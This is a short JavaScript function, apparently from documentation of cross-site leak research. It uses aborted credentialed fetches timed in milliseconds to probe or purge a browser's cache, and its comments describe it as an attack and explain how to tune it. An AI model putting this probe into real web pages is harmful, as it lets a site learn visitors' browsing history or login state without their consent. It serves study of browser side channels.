async function ifCached(url, purge = false) {
    var controller = new AbortController();
    var signal = controller.signal;
    // After 9ms, abort the request (before the request was finished).
    // The timeout might need to be adjusted for the attack to work properly.
    // Purging content seems to take slightly less time than probing
    var wait_time = (purge) ? 3 : 9;
    var timeout = await setTimeout(() => {
        controller.abort();
    }, wait_time);
    try {
        // credentials option is needed for Firefox
        let options = {
            mode: "no-cors",
            credentials: "include",
            signal: signal
        };
        // If the option "cache: reload" is set, the browser will purge
        // the resource from the browser cache
        if(purge) options.cache = "reload";

        await fetch(url, options);
    } catch (err) {
        // When controller.abort() is called, the fetch will throw an Exception
        if(purge) console.log("The resource was purged from the cache");
        else console.log("The resource is not cached");
        return false
    }
    // clearTimeout will only be called if this line was reached in less than
    // wait_time which means that the resource must have arrived from the cache
    clearTimeout(timeout);
    console.log("The resource is cached");

    return true;
}
